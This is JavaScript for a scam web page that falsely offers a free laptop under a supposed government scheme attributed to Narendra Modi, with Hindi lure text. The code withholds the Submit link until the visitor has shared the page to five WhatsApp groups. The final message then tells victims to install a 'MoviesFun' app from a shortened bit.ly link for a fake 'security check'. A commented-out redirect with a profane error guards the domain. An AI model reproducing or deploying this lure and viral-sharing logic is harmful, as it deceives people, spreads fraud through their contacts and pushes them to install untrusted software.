/*
if(window.location.hostname != "nitrowishes.ml"){
    window.location.href="http://www.moviesfun.in/";
    throw new Error("FUCK YOUR MOTHER ASSHOLE");
  }
*/

var myapp = new Vue({
    el: "#app",
    data: {
        title: "Get Free Laptop 2019",
        link: "https://nitrowishes.ml/",
        features: [
            "योजना का लाभ कैसे उठाये ?",
            "नरेंद्र मोदी की तरफ से मुफ्त लैपटॉप योजना",
            "योजना का लाभ उठाने के लिए फार्म भरे",
            "योजना सीमित समय के लिए उपलब्ध है",
            "अपना आर्डर तनिक दीजिये ताकी हम आप तक यह योजना पोहोचा सके"
        ],
        img: "img/img.jpg",
        promotext: "Get Free Laptop by Registering to PM Free Laptop Yojana, Join Now", //whatsapp text
        finaltext: "Done, Now you have to download and install MoviesFun application for our security check. after installation you will recieve a mail on your email address",
        finalimg: "img/app.png",
        applink: "https://bit.ly/moviesfunapp",
        menu: [
            { name: "Home", link: "/"},
            { name: "About Us", link: "/about.html"},
            { name: "Privacy Policy", link: "/privacy.html"},
            { name: "Contact US", link: "/contact.html"}
        ]
    }
})


var n=0;
  
$(".wh").click(function(){
  n++;
  if(n >= 5){
    toastr.success("Thanks for Sharing, Click on Submit !", "Success", {timeOut:15000})
  }
})

$(".submit").click(function(){

if(n < 5){
toastr.error("Please invite at least 5 WhatsApp Groups !<br>"+ (5 - n) +" left")
  }else{
  $(".submit").attr("href","done.html");
}

})

